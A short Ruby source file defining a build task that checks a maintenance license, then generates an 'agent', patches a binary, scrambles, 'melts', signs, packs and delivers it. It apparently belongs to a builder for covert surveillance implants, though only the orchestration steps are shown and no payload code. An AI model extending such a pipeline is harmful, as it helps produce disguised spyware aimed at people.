require_relative '../tasks'

module RCS
module DB

class BuildTask
  include RCS::DB::BuildTaskType

  def total
    18
  end
  
  def builder
    @builder
  end
  
  def next_entry

    raise "Maintenance period expired. Creation failed." unless LicenseManager.instance.check :maintenance

    yield @description = 'Loading components'
    yield @builder.load @params['factory']
    yield @description = 'Unpacking'
    yield @builder.unpack
    yield @description = 'Generating agent'
    yield @builder.generate @params['generate']
    yield @description = 'Patching'
    yield @builder.patch @params['binary']
    yield @description = 'Scrambling'
    yield @builder.scramble
    yield @description = 'Melting'
    yield @builder.melt @params['melt']
    yield @description = 'Signing'
    yield @builder.sign @params['sign']
    yield @description = 'Packing'
    yield @builder.pack @params['package']
    yield @description = 'Delivering'

    # add the username of the creator to be used in the frontend files records
    @params['deliver'] = {} unless @params['deliver']
    @params['deliver']['user'] = @params[:user][:_id]

    yield @builder.deliver @params['deliver']
  end
end

end # DB
end # RCS
